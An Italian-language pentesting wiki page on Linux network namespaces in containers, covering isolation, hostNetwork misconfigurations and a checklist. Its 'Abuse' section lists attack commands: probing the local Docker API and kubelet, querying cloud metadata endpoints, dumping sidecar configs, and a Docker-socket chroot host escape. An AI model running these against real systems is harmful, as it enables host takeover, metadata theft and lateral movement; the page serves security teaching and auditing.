# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il network namespace isola le risorse relative alla rete, come interfacce, indirizzi IP, tabelle di routing, stato ARP/neighbor, regole del firewall, socket, il namespace dei socket astratti UNIX-domain e il contenuto di file come `/proc/net`.<sup>[[2]](#references)</sup> Per questo un container può avere quella che sembra essere una propria `eth0`, le proprie route locali e il proprio dispositivo di loopback senza possedere il vero network stack dell'host.

Dal punto di vista della sicurezza, questo è importante perché l'isolamento di rete riguarda molto più del semplice port binding. Un network namespace privato limita ciò che il workload può osservare o riconfigurare direttamente. Quando questo namespace viene condiviso con l'host, il container può ottenere improvvisamente visibilità sui listener dell'host, sui servizi locali dell'host, sugli endpoint AF_UNIX astratti e sui punti di controllo della rete che non erano mai destinati a essere esposti all'applicazione.

## Operatività

Un network namespace appena creato inizia con un ambiente di rete vuoto o quasi vuoto, finché non vengono collegate delle interfacce. I container runtime creano o collegano quindi interfacce virtuali, assegnano indirizzi e configurano le route, in modo che il workload disponga della connettività prevista. Nelle implementazioni basate su bridge, ciò significa solitamente che il container vede un'interfaccia supportata da veth e collegata a un bridge dell'host. In Kubernetes, i plugin CNI gestiscono la configurazione equivalente per il networking dei Pod.

Questa architettura spiega perché `--network=host` o `hostNetwork: true` rappresentino un cambiamento così significativo. Invece di ricevere uno stack di rete privato e preparato, il workload entra nello stack di rete effettivo dell'host.

## Laboratorio

Puoi vedere un network namespace quasi vuoto con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E puoi confrontare i container normali e quelli con networking dell'host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Il container con host networking non dispone più di una propria vista isolata dei socket e delle interfacce. Questo cambiamento, da solo, è già significativo, prima ancora di chiedersi quali capabilities abbia il processo.

## Utilizzo a runtime

Docker e Podman normalmente creano un network namespace privato per ogni container, salvo diversa configurazione. Kubernetes di solito assegna a ogni Pod un proprio network namespace, condiviso dai container all'interno di quel Pod ma separato dall'host. Ciò significa che `127.0.0.1` è solitamente locale al Pod anziché al container: un listener associato solo a localhost in un container è in genere raggiungibile dai relativi sidecar e container fratelli. Anche i sistemi Incus/LXC forniscono un isolamento basato sui network namespace completo, spesso con una varietà più ampia di configurazioni di virtual networking.

Il principio comune è che il networking privato costituisce il confine di isolamento predefinito, mentre l'host networking è un opt-out esplicito da tale confine.

## Misconfigurazioni

La misconfigurazione più importante consiste semplicemente nel condividere il network namespace dell'host. A volte ciò viene fatto per motivi di performance, per il monitoring low-level o per comodità, ma rimuove uno dei confini più netti disponibili per i container. I listener locali all'host diventano raggiungibili in modo più diretto, i servizi accessibili solo tramite localhost possono diventare accessibili e capabilities come `CAP_NET_ADMIN` o `CAP_NET_RAW` diventano molto più pericolose, perché le operazioni che consentono vengono ora applicate all'ambiente di rete dell'host stesso.

Un altro problema consiste nell'assegnare capabilities relative al networking in eccesso anche quando il network namespace è privato. Un namespace privato è utile, ma non rende innocui i raw socket o il controllo avanzato della rete.

In Kubernetes, `hostNetwork: true` modifica anche il livello di affidamento che si può riporre nella segmentazione di rete a livello di Pod. Kubernetes documenta che molti network plugin non sono in grado di distinguere correttamente il traffico dei Pod `hostNetwork` per il matching di `podSelector` / `namespaceSelector` e pertanto lo trattano come normale traffico del nodo.<sup>[[1]](#references)</sup> Dal punto di vista di un attaccante, ciò significa che un workload `hostNetwork` compromesso dovrebbe spesso essere trattato come un foothold di rete a livello di nodo anziché come un normale Pod ancora vincolato dalle stesse ipotesi sulle policy dei workload che usano una overlay network.

## Abuse

In configurazioni con isolamento debole, gli attaccanti possono esaminare i servizi in ascolto sull'host, raggiungere gli endpoint di gestione associati solo al loopback, sniffare o interferire con il traffico a seconda delle capabilities e dell'ambiente specifici, oppure riconfigurare il routing e lo stato del firewall se è presente `CAP_NET_ADMIN`. In un cluster, ciò può inoltre facilitare il lateral movement e la ricognizione del control plane.

Se sospetti l'uso dell'host networking, inizia verificando che le interfacce e i listener visibili appartengano all'host anziché a una rete container isolata:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
I servizi accessibili solo tramite loopback sono spesso la prima scoperta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
I socket UNIX astratti sono un altro obiettivo facile da trascurare perché hanno un ambito limitato al network namespace, anche se non sembrano listener TCP/UDP e potrebbero non esistere come percorsi nel filesystem sotto `/run`. Un container con rete dell'host può quindi ereditare l'accesso a canali di controllo riservati all'host che non sono mai stati bind-mountati nel container:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Un esempio storico è stato il bug di esposizione dell’abstract socket di `containerd-shim`, ma la lezione più importante va oltre lo specifico CVE: quando un workload entra nel network namespace dell’host, anche i servizi AF_UNIX abstract diventano parte della superficie d’attacco.<sup>[[3]](#references)</sup> Se questi socket sembrano correlati al runtime o amministrativi, passa a [Esposizione delle API del runtime e del daemon](../../runtime-api-and-daemon-exposure.md).

Se sono presenti network capabilities, verifica se il workload può ispezionare o alterare lo stack visibile:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Nei kernel moderni, la rete dell'host insieme a `CAP_NET_ADMIN` può inoltre esporre il percorso dei pacchetti oltre le semplici modifiche a `iptables` / `nftables`. Anche i qdisc e i filtri di `tc` sono limitati al namespace, quindi, in un network namespace dell'host condiviso, si applicano alle interfacce dell'host visibili al container. Se è presente anche `CAP_BPF`, diventano rilevanti anche programmi eBPF correlati alla rete, come i loader TC e XDP:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Questo è importante perché un attaccante potrebbe essere in grado di eseguire il mirror, il redirect, lo shaping o il drop del traffico a livello dell’interfaccia host, non solo di riscrivere le regole del firewall. In un private network namespace, queste azioni sono limitate alla visualizzazione del container; in un namespace host condiviso, invece, hanno un impatto sull’host.

Negli ambienti cluster o cloud, il networking dell’host giustifica anche un rapido recon locale dei metadata e dei servizi adiacenti al control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes, ricorda che compromettere **qualsiasi** container in un Pod con più container dà anche accesso ai listener localhost aperti dai container sibling e dai sidecar, perché l'intero Pod condivide un unico network namespace. Questo è particolarmente rilevante per i container di service mesh, observability e helper, le cui interfacce di amministrazione o debug sono intenzionalmente interne al Pod anziché disponibili a livello di cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Considera "bound to localhost" come **Pod-private**, non **container-private**. Dopo la compromissione di un container nel Pod, questa assunzione viene meno.

### Esempio completo: Host Networking + Accesso al Runtime locale / Kubelet

Host networking non fornisce automaticamente i privilegi di root sull'host, ma spesso espone servizi che sono intenzionalmente raggiungibili solo dal nodo stesso. Se uno di questi servizi è protetto debolmente, host networking diventa un percorso diretto per l'escalation dei privilegi.

Docker API su localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet su localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impatto:

- compromissione diretta dell'host se un'API del runtime locale è esposta senza una protezione adeguata
- ricognizione del cluster o movimento laterale se kubelet o gli agent locali sono raggiungibili
- manipolazione del traffico o denial of service se combinati con `CAP_NET_ADMIN`

## Verifiche

L'obiettivo di queste verifiche è capire se il processo dispone di uno stack di rete privato, quali route e listener sono visibili e se la visualizzazione della rete appare già simile a quella dell'host prima ancora di testare le capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Cosa è interessante qui:

- Se `/proc/self/ns/net` e `/proc/1/ns/net` hanno già un aspetto simile a quello dell'host, il container potrebbe condividere il network namespace dell'host o un altro namespace non privato.
- `lsns -t net` e `ip netns identify` sono utili quando la shell è già all'interno di un namespace denominato o persistente e vuoi correlarlo con gli oggetti di `/run/netns` dal lato dell'host.
- `ss -lntup` è particolarmente utile perché rivela listener accessibili solo tramite loopback ed endpoint di gestione locali. `ss -xap` e `/proc/net/unix` aggiungono la vista degli abstract socket che le normali ricerche dei socket nel filesystem non rilevano.
- Le route, i nomi delle interfacce, il contesto del firewall, lo stato di `tc` e gli attachment eBPF diventano molto più importanti se sono presenti `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF`.
- In Kubernetes, la risoluzione fallita dei service name da un Pod `hostNetwork` può semplicemente significare che il Pod non sta usando `dnsPolicy: ClusterFirstWithHostNet`, non che il service sia assente.
- Nei Pod multi-container, i listener su localhost appartengono all'intero network namespace del Pod; quindi controlla i sidecar e i container fratelli prima di presumere che una porta accessibile solo tramite loopback sia irraggiungibile dal container compromesso.

Quando esamini un container, valuta sempre il network namespace insieme al capability set. Il networking dell'host insieme a capability di rete elevate rappresenta una postura molto diversa rispetto al networking bridge insieme a un capability set predefinito e limitato.

## Riferimenti

- [1] [NetworkPolicy di Kubernetes e criticità di `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [`network_namespaces(7)` di Linux e isolamento degli abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [Advisory di containerd: abstract Unix domain socket esposti ai container con networking dell'host](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [Requisiti di token e capability eBPF per i programmi eBPF correlati alla rete](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
